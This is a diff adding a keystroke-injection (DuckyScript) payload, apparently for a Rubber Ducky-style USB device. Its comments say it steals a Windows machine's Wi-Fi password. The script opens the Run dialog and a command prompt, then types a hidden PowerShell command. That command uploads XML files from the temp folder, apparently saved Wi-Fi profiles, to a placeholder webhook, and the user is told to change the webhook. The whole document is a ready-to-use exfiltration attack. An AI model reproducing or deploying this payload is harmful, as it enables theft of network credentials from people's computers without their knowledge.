@@ -1,0 +1,16 @@
+REM author: bst04
+REM GET the password of the wifi to a webhook
+REM CHANGE THE WEBHOOK
+
+DELAY 1000
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 1000
+STRING powershell -NoP -W Hidden -Command "[System.Reflection.Assembly]::LoadWithPartialName('System.Net.Http') | Out-Null; $filePath = Get-ChildItem '%temp%\*.xml' | Select-Object -ExpandProperty FullName; $uri = 'https://webhook'; $content = New-Object System.Net.Http.MultipartFormDataContent; $content.Add((New-Object System.Net.Http.StringContent('Wi-Fi Data')), 'content'); $content.Add((New-Object System.Net.Http.StreamContent([System.IO.File]::OpenRead($filePath))), 'file', [System.IO.Path]::GetFileName($filePath)); $client = New-Object System.Net.Http.HttpClient; $client.PostAsync($uri, $content).Wait()"
+DELAY 1000
+ENTER
+DELAY 500
+STRING exit
+ENTER
